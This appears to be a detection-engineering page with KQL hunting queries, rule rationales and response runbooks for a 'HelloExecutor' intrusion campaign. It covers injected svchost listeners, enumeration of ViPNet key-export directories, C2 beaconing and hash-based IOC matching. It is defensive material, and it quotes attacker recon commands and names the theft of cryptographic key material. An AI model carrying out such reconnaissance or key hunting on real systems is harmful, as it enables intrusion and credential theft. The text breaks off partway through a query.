1) Triage: confirm the svchost PID matches an injected process (cross-ref rule #2 image-load and tesh4RPC.txt writer). 2) Contain: capture memory of the svchost PID, then isolate and kill; block the ports at host firewall. 3) Hunt: look for inbound sessions to 5003/5060 and the outbound tunnel forwarding local:5003 to 5.39.253.206.
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where ActionType == "ListeningConnectionCreated"
| where LocalPort in (5003, 5060)
| where InitiatingProcessFileName =~ "svchost.exe"
| project Timestamp, DeviceName, LocalIP, LocalPort, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessParentFileName
| order by Timestamp desc
// Microsoft Sentinel — auto-derived from the Defender XDR hunt.
// Requires the Microsoft 365 Defender data connector (streams the
// advanced-hunting tables into Sentinel; Timestamp → TimeGenerated).
DeviceNetworkEvents
| where TimeGenerated > ago(30d)
| where ActionType == "ListeningConnectionCreated"
| where LocalPort in (5003, 5060)
| where InitiatingProcessFileName =~ "svchost.exe"
| project TimeGenerated, DeviceName, LocalIP, LocalPort, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessParentFileName
| order by TimeGenerated desc
HelloExecutor recon: injected svchost enumerating ViPNet/InfoTeCS export directories AIActions on Objectives High
Detects HelloExecutor reconnaissance where the injected svchost.exe (netsvcs) shells out to enumerate InfoTeCS/ViPNet Administrator key-container Export directories (kc\Export). svchost spawning shell commands that reference infotecs+ViPNet is highly abnormal and specific to this campaign's key-material hunting. Rationale: The article lists explicit recon commands enumerating 'C:\Program Files (x86)\infotecs\ViPNet Administrator', 'ViPNet Client\Export', and 'ViPNet Administrator\kc\Export' — the attackers are hunting ViPNet key material. Requiring an svchost(netsvcs) parent plus infotecs+ViPNet in the child command line makes this campaign-specific rather than a generic 'dir' hunt. Cross-checked against: • https://securelist.com/tr/hellonet-vipnet/120700/
ATT&CKT1083 T1057 T1552.004
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A ViPNet administrator legitimately scripting an inventory of Export directories (parent will be cmd/powershell/explorer, not svchost)
  • Backup software indexing InfoTeCS folders (not spawned by svchost netsvcs)
  • Endpoint asset-management agent scanning Program Files
Suppression filter
| where InitiatingProcessParentFileName =~ "services.exe"
Response runbook
1) Triage: confirm the parent svchost is the injected instance (cross-ref wtsapi32.dll sideload / tesh4RPC.txt on the same host); the netsvcs svchost should never spawn cmd/net/dir. 2) Contain: isolate host, capture svchost memory, and treat any ViPNet key material in kc\Export as compromised — flag for certificate/key reissue. 3) Hunt: pull the full recon command set (query user, ipconfig /all, net user /do, net group /do) from the same PID and check for HelloCleaner log-wiping and outbound to 5.39.253.206.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where InitiatingProcessFileName =~ "svchost.exe" and InitiatingProcessCommandLine has "netsvcs"
| where ProcessCommandLine has "infotecs" and ProcessCommandLine has "ViPNet"
| where ProcessCommandLine has_any ("ViPNet Administrator", "kc\\Export", "ViPNet Client\\Export")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine, InitiatingProcessId
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where ParentProcessName endswith @"\svchost.exe"
| where CommandLine has "infotecs" and CommandLine has "ViPNet"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine, ParentProcessName
| order by TimeGenerated desc

Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc

// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("16c211c96735f2fae9361b89bd7a31bf", "1bfe2b9493128574907a8279256a8bcc", "f9eed2f0158dc98e7012fb809152209c", "6001829a128fe264b4403138700c11a8", "ee4ff46ddd8489e81447962f927bc3f6", "41c938b3cd7e55d4077e34976929b140", "b103cd21280b4061f88b2bcc51394894", "9f5606a0755bc633b9bd7db6d179c09e", "0cfdffc56f0fa325d0c4d24780b46597") or SHA1 in~ ("16c211c96735f2fae9361b89bd7a31bf", "1bfe2b9493128574907a8279256a8bcc", "f9eed2f0158dc98e7012fb809152209c", "6001829a128fe264b4403138700c11a8", "ee4ff46ddd8489e81447962f927bc3f6", "41c938b3cd7e55d4077e34976929b140", "b103cd21280b4061f88b2bcc51394894", "9f5606a0755bc633b9bd7db6d179c09e", "0cfdffc56f0fa325d0c4d24780b46597") or MD5 in~ ("16c211c96735f2fae9361b89bd7a31bf", "1bfe2b9493128574907a8279256a8bcc", "f9eed2f0158dc98e7012fb809152209c", "6001829a128fe264b4403138700c11a8", "ee4ff46ddd8489e81447962f927bc3f6", "41c938b3cd7e55d4077e34976929b140", "b103cd21280b4061f88b2bcc51394894", "9f5606a0755bc633b9bd7db6d179c09e", "0cfdffc56f0fa325d0c4d24780b46597")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("16c211c96735f2fae9361b89bd7a31bf", "1bfe2b9493128574907a8279256a8bcc", "f9eed2f0158dc98e7012fb809152209c", "6001829a128fe264b4403138700c11a8", "ee4ff46ddd8489e81447962f927bc3f6", "41c938b3cd7e55d4077e34976929b140", "b103cd21280b4061f88b2bcc51394894", "9f5606a0755bc633b9bd7db6d179c09e", "0cfdffc56f0fa325d0c4d24780b46597") or SHA1 in~ ("16c211c96735f2fae9361b89bd7a31bf", "1bfe2b9493128574907a8279256a8bcc", "f9eed2f0158dc98e7012fb809152209c", "6001829a128fe264b4403138700c11a8", "ee4ff46ddd8489e81447962f927bc3f6", "41c938b3cd7e55d4077e34976929b140", "b103cd21280b4061f88b2bcc51394894", "9f5606a0755bc633b9bd7db6d179c09e", "0cfdffc56f0fa325d0c4d24780b46597") or MD5 in~ ("16c211c96735f2fae9361b89bd7a31bf", "1bfe2b9493128574907a8279256a8bcc", "f9eed2f0158dc98e7012fb809152209c", "6001829a128fe264b4403138700c11a8", "ee4ff46ddd8489e81447962f927bc3f6", "41c938b3cd7e55d4077e34976929b140", "b103cd21280b4061f88b2bcc51394894", "9f5606a0755bc633b9bd7db6d179c09e", "0cfdffc56f0fa325d0c4d24780b46597")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["16c211c96735f2fae9361b89bd7a31bf", "1bfe2b9493128574907a8279256a8bcc", "f9eed2f0158dc98e7012fb809152209c", "6001829a128fe264b4403138700c11a8", "ee4ff46ddd8489e81447962f927bc3f6", "41c938b3cd7e55d4077e34976929b140", "b103cd21280b4061f88b2bcc51394894", "9f5606a0755bc633b9bd7db6d179c09e", "0cfdffc56f0fa325d0c4d24780b46597"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
